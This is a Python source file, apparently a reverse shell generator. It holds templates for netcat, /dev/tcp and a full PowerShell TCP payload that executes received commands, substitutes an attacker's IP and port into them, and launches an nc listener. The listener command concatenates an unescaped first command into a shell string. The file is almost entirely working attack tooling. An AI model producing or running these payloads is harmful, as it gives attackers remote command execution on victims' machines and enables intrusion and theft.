
reverse_shells = {
	'windows-nc': 'NC_PATH IP PORT -e SHELL',
	'windows-powershell': '$LHOST = "IP"; $LPORT = PORT; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()',
	'linux-sh': 'SHELL -i >& /dev/tcp/IP/PORT 0>&1',
	'linux-nc': 'NC_PATH IP PORT -e SHELL',
}

def check_args(os, mode, ip, port, sh, nc_path):
	if os != 'linux' and os != 'windows':
		print('OS must be either linux or windows')
		return False
	if mode not in ['nc', 'sh', 'powershell']:
		print('Mode must be either nc, sh or powershell')
		return False
	if type(port) != int:
		print('Port must be a number')
		return False
	return True

def generate_for_win(mode, ip, port, sh=None, nc_path=None):
	try:
		if mode == 'nc':
			sh = sh if sh else 'powershell'
			nc_path = nc_path if nc_path else 'nc.exe'
			shell = reverse_shells['windows-nc']
			shell = shell.replace('NC_PATH', nc_path)
			shell = shell.replace('IP', ip)
			shell = shell.replace('PORT', str(port))
			shell = shell.replace('SHELL', sh)
			return shell
		elif mode == 'powershell':
			shell = reverse_shells['windows-powershell']
			shell = shell.replace('IP', ip)
			shell = shell.replace('PORT', str(port))
			return shell
	except Exception as e:
		print(e)

def generate_for_linux(mode, ip, port, sh=None, nc_path=None):
	try:
		if mode == 'sh':
			shell = reverse_shells['linux-sh']
			sh = sh if sh else 'sh'
			shell = shell.replace('SHELL', sh)
			shell = shell.replace('IP', ip)
			shell = shell.replace('PORT', str(port))
			return shell
		elif mode == 'nc':
			nc_path = nc_path if nc_path else 'nc'
			sh = sh if sh else 'sh'
			shell = reverse_shells['linux-nc']
			shell = shell.replace('NC_PATH', nc_path)
			shell = shell.replace('IP', ip)
			shell = shell.replace('PORT', str(port))
			shell= shell.replace('SHELL', sh)
			return shell
	except Exception as e:
		print(e)

def wait_for_connection(port, first_command=None):
	import subprocess

	cmd = 'nc -lvnp PORT'
	if first_command:
		cmd = 'echo ' + first_command + ' | ' + cmd
		cmd = cmd.replace('PORT', str(port))
		subprocess.run(cmd , shell=True)
	else:
		cmd = cmd.replace('PORT', str(port))
		subprocess.run(cmd, shell=True)

def generate(os, mode, ip, port=4444, sh=None, nc_path=None):
	if check_args(os, mode, ip, port, sh, nc_path) != True:
		return
	if os == 'windows':
		return generate_for_win(mode, ip, port, sh, nc_path)
	elif os == 'linux':
		return generate_for_linux(mode, ip, port, sh, nc_path)

